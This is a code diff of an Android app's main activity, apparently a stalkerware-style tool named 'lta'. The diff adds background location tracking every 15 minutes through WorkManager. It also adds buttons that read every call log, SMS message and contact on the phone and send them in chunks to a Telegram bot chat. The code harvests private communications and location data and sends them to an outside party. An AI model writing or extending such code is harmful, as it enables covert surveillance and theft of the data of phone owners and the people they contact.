@@ -1,60 +1,57 @@
+// MainActivity.kt
 package com.example.lta
 
 import android.Manifest
+import android.os.Build
 import android.os.Bundle
 import android.widget.Toast
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
-import androidx.activity.enableEdgeToEdge
-import androidx.compose.foundation.layout.Arrangement
-import androidx.compose.foundation.layout.Column
-import androidx.compose.foundation.layout.Spacer
-import androidx.compose.foundation.layout.fillMaxSize
-import androidx.compose.foundation.layout.height
-import androidx.compose.foundation.layout.padding
+import androidx.compose.foundation.layout.*
+import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.verticalScroll
 import androidx.compose.material3.Button
+import androidx.compose.material3.Divider
 import androidx.compose.material3.Scaffold
 import androidx.compose.material3.Text
-import androidx.compose.runtime.Composable
-import androidx.compose.runtime.getValue
-import androidx.compose.runtime.mutableStateOf
-import androidx.compose.runtime.remember
-import androidx.compose.runtime.rememberCoroutineScope
-import androidx.compose.runtime.setValue
+import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.platform.LocalContext
-import androidx.compose.ui.tooling.preview.Preview
+import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.compose.ui.unit.sp
+import androidx.work.*
 import com.example.lta.ui.theme.LtaTheme
 import kotlinx.coroutines.launch
+import java.util.concurrent.TimeUnit
 
 class MainActivity : ComponentActivity() {
 
     private lateinit var permissionManager: PermissionManager
     private lateinit var manualDataManager: ManualDataManager
     private lateinit var telegramBotApi: TelegramBotApi
-
-    // TODO: Replace with your actual bot token and chat ID, ideally from a secure source
-    private val BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-    private val CHAT_ID = "YOUR_TELEGRAM_CHAT_ID"
+    private lateinit var workManager: WorkManager
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        enableEdgeToEdge()
-
         permissionManager = PermissionManager(this)
         manualDataManager = ManualDataManager(applicationContext)
-        telegramBotApi = TelegramBotApi(BOT_TOKEN, CHAT_ID)
+        telegramBotApi = TelegramBotApi(
+            applicationContext.getString(R.string.telegram_bot_token),
+            applicationContext.getString(R.string.telegram_chat_id)
+        )
+        workManager = WorkManager.getInstance(applicationContext)
 
         setContent {
             LtaTheme {
                 Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
-                    ManualDataExportScreen(
+                    ControlPanelScreen(
                         modifier = Modifier.padding(innerPadding),
                         permissionManager = permissionManager,
                         manualDataManager = manualDataManager,
-                        telegramBotApi = telegramBotApi
+                        telegramBotApi = telegramBotApi,
+                        workManager = workManager
                     )
                 }
             }
@@ -63,116 +60,160 @@ class MainActivity : ComponentActivity() {
 }
 
 @Composable
-fun ManualDataExportScreen(
+fun ControlPanelScreen(
     modifier: Modifier = Modifier,
     permissionManager: PermissionManager,
     manualDataManager: ManualDataManager,
-    telegramBotApi: TelegramBotApi
+    telegramBotApi: TelegramBotApi,
+    workManager: WorkManager
 ) {
     val context = LocalContext.current
     val coroutineScope = rememberCoroutineScope()
-
-    var lastActionMessage by remember { mutableStateOf("Press a button to send data.") }
+    var statusMessage by remember { mutableStateOf("Ready.") }
 
     Column(
-        modifier = modifier.fillMaxSize(),
-        verticalArrangement = Arrangement.Center,
+        modifier = modifier
+            .fillMaxSize()
+            .padding(16.dp)
+            .verticalScroll(rememberScrollState()),
         horizontalAlignment = Alignment.CenterHorizontally
     ) {
-        Text(text = lastActionMessage)
+        Text("Status: $statusMessage", fontWeight = FontWeight.Bold)
+        Spacer(modifier = Modifier.height(16.dp))
+        Divider()
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // --- LOCATION TRACKING CONTROLS ---
+        Text("Location Tracking (WorkManager)", fontSize = 18.sp, fontWeight = FontWeight.Bold)
+        Spacer(modifier = Modifier.height(16.dp))
+
+        Button(onClick = {
+            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    permissionManager.requestPermission(Manifest.permission.ACCESS_BACKGROUND_LOCATION) {
+                        schedulePeriodicLocationWorker(workManager)
+                        statusMessage = "Periodic location tracking started."
+                        Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+                    }
+                } else {
+                    schedulePeriodicLocationWorker(workManager)
+                    statusMessage = "Periodic location tracking started."
+                    Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+                }
+            }
+        }) {
+            Text("Start Periodic Tracking (15 min)")
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(onClick = {
+            workManager.cancelUniqueWork(LocationWorker.UNIQUE_WORK_NAME)
+            statusMessage = "Periodic location tracking stopped."
+            Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+        }) {
+            Text("Stop Periodic Tracking")
+        }
+        Spacer(modifier = Modifier.height(8.dp))
+
+        Button(onClick = {
+            statusMessage = "Requesting one-time location..."
+            permissionManager.requestPermission(Manifest.permission.ACCESS_FINE_LOCATION) {
+                val oneTimeWorkRequest = OneTimeWorkRequestBuilder<LocationWorker>()
+                    .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+                    .build()
+                workManager.enqueue(oneTimeWorkRequest)
+                statusMessage = "One-time location request enqueued."
+                Toast.makeText(context, statusMessage, Toast.LENGTH_SHORT).show()
+            }
+        }) {
+            Text("Send Location Now")
+        }
         Spacer(modifier = Modifier.height(24.dp))
+        Divider()
+        Spacer(modifier = Modifier.height(16.dp))
 
-        Button(onClick = {
-            lastActionMessage = "Requesting READ_CALL_LOG permission..."
-            permissionManager.requestPermission(Manifest.permission.READ_CALL_LOG,
-                onGranted = {
-                    lastActionMessage = "Reading call logs..."
-                    coroutineScope.launch {
-                        val callLogs = manualDataManager.getCallLogs()
-                        val success = telegramBotApi.sendMessage("Call Logs:\n" + callLogs)
-                        if (success) {
-                            lastActionMessage = "Call logs sent successfully!"
-                            Toast.makeText(context, "Call logs sent!", Toast.LENGTH_SHORT).show()
-                        } else {
-                            lastActionMessage = "Failed to send call logs."
-                            Toast.makeText(context, "Failed to send call logs.", Toast.LENGTH_SHORT).show()
-                        }
-                    }
-                },
-                onDenied = {
-                    lastActionMessage = "READ_CALL_LOG permission denied."
-                    Toast.makeText(context, "Permission denied for call logs.", Toast.LENGTH_SHORT).show()
-                }
-            )
-        }) {
-            Text("Send Call Logs")
-        }
-
+        // --- MANUAL DATA EXPORT BUTTONS ---
+        Text("Manual Data Export", fontSize = 18.sp, fontWeight = FontWeight.Bold)
         Spacer(modifier = Modifier.height(16.dp))
 
         Button(onClick = {
-            lastActionMessage = "Requesting READ_SMS permission..."
-            permissionManager.requestPermission(Manifest.permission.READ_SMS,
-                onGranted = {
-                    lastActionMessage = "Reading SMS messages..."
-                    coroutineScope.launch {
-                        val smsMessages = manualDataManager.getSmsMessages()
-                        val success = telegramBotApi.sendMessage("SMS Messages:\n" + smsMessages)
-                        if (success) {
-                            lastActionMessage = "SMS messages sent successfully!"
-                            Toast.makeText(context, "SMS messages sent!", Toast.LENGTH_SHORT).show()
-                        } else {
-                            lastActionMessage = "Failed to send SMS messages."
-                            Toast.makeText(context, "Failed to send SMS messages.", Toast.LENGTH_SHORT).show()
-                        }
-                    }
-                },
-                onDenied = {
-                    lastActionMessage = "READ_SMS permission denied."
-                    Toast.makeText(context, "Permission denied for SMS.", Toast.LENGTH_SHORT).show()
+            permissionManager.requestPermission(Manifest.permission.READ_CALL_LOG) {
+                statusMessage = "Exporting all call logs..."
+                coroutineScope.launch {
+                    val callLogs = manualDataManager.getCallLogs()
+                    sendDataInChunks(callLogs, "Call Logs", telegramBotApi)
+                    statusMessage = "${callLogs.size} call logs sent."
                 }
-            )
+            }
         }) {
-            Text("Send SMS Messages")
+            Text("Export All Call Logs")
         }
-
         Spacer(modifier = Modifier.height(16.dp))
 
         Button(onClick = {
-            lastActionMessage = "Requesting READ_CONTACTS permission..."
-            permissionManager.requestPermission(Manifest.permission.READ_CONTACTS,
-                onGranted = {
-                    lastActionMessage = "Reading contacts..."
-                    coroutineScope.launch {
-                        val contacts = manualDataManager.getContacts()
-                        val success = telegramBotApi.sendMessage("Contacts:\n" + contacts)
-                        if (success) {
-                            lastActionMessage = "Contacts sent successfully!"
-                            Toast.makeText(context, "Contacts sent!", Toast.LENGTH_SHORT).show()
-                        } else {
-                            lastActionMessage = "Failed to send contacts."
-                            Toast.makeText(context, "Failed to send contacts.", Toast.LENGTH_SHORT).show()
-                        }
-                    }
-                },
-                onDenied = {
-                    lastActionMessage = "READ_CONTACTS permission denied."
-                    Toast.makeText(context, "Permission denied for contacts.", Toast.LENGTH_SHORT).show()
+            permissionManager.requestPermission(Manifest.permission.READ_SMS) {
+                statusMessage = "Exporting all SMS..."
+                coroutineScope.launch {
+                    val smsList = manualDataManager.getSmsMessages()
+                    sendDataInChunks(smsList, "SMS Messages", telegramBotApi)
+                    statusMessage = "${smsList.size} SMS messages sent."
                 }
-            )
+            }
         }) {
-            Text("Send Contacts")
+            Text("Export All SMS")
+        }
+        Spacer(modifier = Modifier.height(16.dp))
+
+        Button(onClick = {
+            permissionManager.requestPermission(Manifest.permission.READ_CONTACTS) {
+                statusMessage = "Exporting all contacts..."
+                coroutineScope.launch {
+                    val contacts = manualDataManager.getContacts()
+                    sendDataInChunks(contacts, "Contacts", telegramBotApi)
+                    statusMessage = "${contacts.size} contacts sent."
+                }
+            }
+        }) {
+            Text("Export All Contacts")
         }
     }
 }
 
-@Preview(showBackground = true)
-@Composable
-fun ManualDataExportScreenPreview() {
-    LtaTheme {
-        // In a preview, we can't fully mock PermissionManager, ManualDataManager, TelegramBotApi
-        // so we'll pass dummy instances or nulls if the composable can handle it.
-        // For a real preview, you'd usually mock these dependencies.
-        ManualDataExportScreen(permissionManager = PermissionManager(MainActivity()), manualDataManager = ManualDataManager(LocalContext.current), telegramBotApi = TelegramBotApi("DUMMY_TOKEN", "DUMMY_CHAT_ID"))
+private fun schedulePeriodicLocationWorker(workManager: WorkManager) {
+    val constraints = Constraints.Builder()
+        .setRequiredNetworkType(NetworkType.CONNECTED)
+        .build()
+
+    val periodicWorkRequest = PeriodicWorkRequestBuilder<LocationWorker>(15, TimeUnit.MINUTES)
+        .setConstraints(constraints)
+        .build()
+
+    workManager.enqueueUniquePeriodicWork(
+        LocationWorker.UNIQUE_WORK_NAME,
+        ExistingPeriodicWorkPolicy.KEEP,
+        periodicWorkRequest
+    )
+}
+
+// Simplified permission request extension
+fun PermissionManager.requestPermission(permission: String, onGranted: () -> Unit) {
+    this.requestPermission(permission, onGranted) { /* Handle denial if needed, empty for now */ }
+}
+
+// Helper function to send large amounts of data in chunks to avoid API limits
+private suspend fun sendDataInChunks(data: List<String>, title: String, api: TelegramBotApi) {
+    if (data.isEmpty()) {
+        api.sendMessage("$title: No data found.")
+        return
+    }
+
+    val chunkSize = 20 // Number of records per Telegram message
+    data.chunked(chunkSize).forEachIndexed { index, chunk ->
+        val messageBuilder = StringBuilder()
+        messageBuilder.append("--- $title (Part ${index + 1}) ---\n\n")
+        chunk.forEach { item ->
+            messageBuilder.append(item).append("\n")
+        }
+        api.sendMessage(messageBuilder.toString())
     }
 }
